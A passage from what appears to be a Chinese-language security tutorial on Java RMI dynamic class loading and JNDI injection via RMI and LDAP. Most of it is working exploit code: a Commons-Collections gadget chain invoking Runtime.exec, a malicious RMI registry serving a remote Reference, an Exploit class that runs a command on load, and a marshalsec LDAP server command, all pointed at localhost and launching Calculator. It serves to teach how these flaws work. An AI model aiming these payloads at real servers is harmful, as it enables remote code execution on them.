    import java.rmi.server.UnicastRemoteObject;
    public class RMITEST {
        public static void main(String[] args) throws RemoteException, MalformedURLException {
            try {
                System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/commons-collections-3.1.jar");
                //实例化对象
                RemoteHello h = new RemoteHelloImpl();
                //用于导出远程对象，将此服务转换为远程服务接口
                RemoteHello skeleton = (RemoteHello) UnicastRemoteObject.exportObject(h, 0);
                //// 将RMI服务注册到1099端口:
                LocateRegistry.createRegistry(1099);
                // 注册此服务，服务名为"Hello":
                Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
                //Naming.rebind("Hello", h);
            } catch (RemoteException e) {
                e.printStackTrace();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }
        }
    }
受害攻击客户端代码：
    package RMI;
    import java.rmi.RMISecurityManager;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class RMIClient {
        public static void main(String[] args) throws Exception {
            System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
            RMISecurityManager securityManager = new RMISecurityManager();
            System.setSecurityManager(securityManager);
            // 连接到服务器localhost，端口1099:
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            // 查找名称为"Hello"的服务并强制转型为Hello接口:
            RemoteHello h = (RemoteHello) registry.lookup("Hello");
            // 正常调用接口方法:
            //String rs = h.sayHello("rai4over");
            //String rs = h.exp1(payload());
            Object rs = h.exp2();
            // 打印调用结果:
            System.out.println(rs);
        }
    }
`Resource`目录下的`java.policy`配置权限如下：
    grant {
       permission java.security.AllPermission;
    };
运行客户端，具体命令（classpath太长省略）如下：
    java -Djava.rmi.server.useCodebaseOnly=false -Dfile.encoding=UTF-8 -classpath /AAAAA:/BBBBB RMI.RMIClient
客户端成功远程动态加载`commons-collections-3.1.jar`并完成RCE。
如果服务端没有设置`java.rmi.server.codebase`指定远程动态加载代码的位置，也可以通过客户端自行指定：
    java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:8000/commons-collections-3.1.jar -Dfile.encoding=UTF-8 -classpath /AAAAA:/BBBBB RMI.RMIClient
#### 服务端动态加载
恶意客户端代码：
    package RMI;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class RMIClient {
        public static void main(String[] args) throws Exception {
            System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/commons-collections-3.1.jar");
            // 连接到服务器localhost，端口1099:
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            // 查找名称为"Hello"的服务并强制转型为Hello接口:
            RemoteHello h = (RemoteHello) registry.lookup("Hello");
            // 正常调用接口方法:
            //String rs = h.sayHello("rai4over");
            String rs = h.exp1(payload());
            //Object rs = h.exp2();
            // 打印调用结果:
            System.out.println(rs);
        }
        public static Object payload() throws Exception {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map map = new HashMap();
            map.put("value", "lala");
            Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Target.class, transformedMap);
            return instance;
        }
    }
受害服务端代码：
    package RMI;
    import java.net.MalformedURLException;
    import java.rmi.Naming;
    import java.rmi.RMISecurityManager;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.server.UnicastRemoteObject;
    public class RMITEST {
        public static void main(String[] args) throws RemoteException, MalformedURLException {
            try {
                System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
                RMISecurityManager securityManager = new RMISecurityManager();
                System.setSecurityManager(securityManager);
                //实例化对象
                RemoteHello h = new RemoteHelloImpl();
                //用于导出远程对象，将此服务转换为远程服务接口
                RemoteHello skeleton = (RemoteHello) UnicastRemoteObject.exportObject(h, 0);
                //// 将RMI服务注册到1099端口:
                LocateRegistry.createRegistry(1099);
                // 注册此服务，服务名为"Hello":
                Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
                //Naming.rebind("Hello", h);
            } catch (RemoteException e) {
                e.printStackTrace();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }
        }
    }
运行方法与上文相同
# RMI 工厂模式
除了代理模式，RMI还存在经典的工厂模式，流程图如下：
`ProductImp`为远程对象，`FactoryImpl`对象指向`ProductImp对象`，大致流程如下：
  * 创建`FactoryImpl对象`，设置`FactoryImpl对象`的`指向ProductImp`（通过HTTP等协议定位，可以位于其他服务器），具有指向功能的对象也可以叫做`reference对象`。
  * 服务器端的`RMI Registry`启动，创建并注册`reference对象`（指向`FactoryImpl对象`），通过`Name`和`reference对象`进行关联绑定，以供客户端进行查询。
  * 客户端对`RMI Registry`发起请求，根据提供的`Name`得到指向`FactoryImpl对象`的`reference对象`。
  * 客户端加载`FactoryImpl对象`到本地，并调用`FactoryImpl对象`的方法，得到指向`ProductImp对象`的`reference对象`。
  * 客户端加载`ProductImp对象`到本地，并调用`ProductImp对象`的方法，得到最终结果。
这里执行远程对象的方法的是RMI通讯的客户端，为攻击客户端的方式，是在具体的代码和利用场景可以参考FastJson中的JNDI注入。
# JNDI 定义
JNDI（Java Naming and Directory
Interface），是SUN公司提供的一种标准的Java命名系统接口。为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。
JNDI由JNDI API、命名管理、JNDI SPI（service provider
interface）服务提供的接口。我们的应用可以通过JNDI的API去访问相关服务提供的接口。
我们要使用JNDI，必须要有服务提供方，我们常用的就是JDBC驱动提供数据库连接服务，然后我们配置JNDI连接。。
JDK也为我们提供了一些服务接口：
  * LDAP （Lightweight Directory Access Protocol） 轻量级目录访问协议
  * CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务
  * RMI（Java Remote Method Invocation）JAVA远程远程方法调用注册
  * DNS（Domain Name Service）域名服务
漏洞中涉及到最多的就是`RMI`，`LDAP`两种服务接口
# JNDI注入
当`lookup`函数的参数`url`可控时，就是所谓的JNDI注入，使用的其实就是工厂模式。
## RMI协议
测试环境：
  * `com.sun.jndi.rmi.object.trustURLCodebase` 为`true`，`JDK 6u132`、`7u122`、`8u113` 开始默认为`false`，测试环境为`java version "1.8.0_112"`
恶意服务器代码：
    package JNDI;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.Registry;
    import java.rmi.registry.LocateRegistry;
    public class JNDISERVER {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference Exploit = new Reference("Exploit", "Exploit", "http://127.0.0.1:8000/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(Exploit);
            registry.bind("Exploit", refObjWrapper);
        }
    }
返回一个`reference对象`，并且指向`http://127.0.0.1:8000/Exploit`，流程和工厂模式一样。
Exploit源代码：
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    import java.util.Hashtable;
    public class Exploit implements ObjectFactory
    {
        static {
            System.err.println("Pwned");
            try {
                String[] cmd = {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"};
                java.lang.Runtime.getRuntime().exec(cmd);
            } catch ( Exception e ) {
                e.printStackTrace();
            }
        }
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
            return null;
        }
    }
编译后放入`http://127.0.0.1:8000/`根目录
受害者JNDI客户端代码：
    package JNDI;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.util.Properties;
    public class JNDIClient {
        public static void main(String[] args) throws NamingException {
            Properties env = new Properties();
            env.put(Context.INITIAL_CONTEXT_FACTORY,
                    "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL,
                    "rmi://127.0.0.1:1099/");
            Context ctx = new InitialContext(env);
            ctx.lookup("Exploit");
            //ctx.lookup("rmi://127.0.0.1:1099/Exploit");
            //ctx.lookup("ldap://127.0.0.1:1099/Exploit");
        }
    }
如果通过`env`设置上下文的环境变量为`rmi://127.0.0.1:1099/`，后面lookup则不需要ULR定位，可以直接为已绑定的`Name`。
lookup支持动态协议转换，即便已经设置了上下文，也可以重新指定URL，比如使用ldap协议。
## LDAP协议
LDAP协议也需要满足条件，但适用范围更广泛：
  * `com.sun.jndi.ldap.object.trustURLCodebase` 为`true`，`JDK 11.0.1`、`8u191`、`7u201`、`6u211`开始默认为`false`，测试环境为`java version "1.8.0_112"`。
这里直接使用`marshalsec`启动恶意的LDAP服务器
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/\#Exploit 1099
## 小结
# 参考
[https://www.mi1k7ea.com/2019/09/01/Java-RMI%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8/](https://www.mi1k7ea.com/2019/09/01/Java-RMI原理与使用/)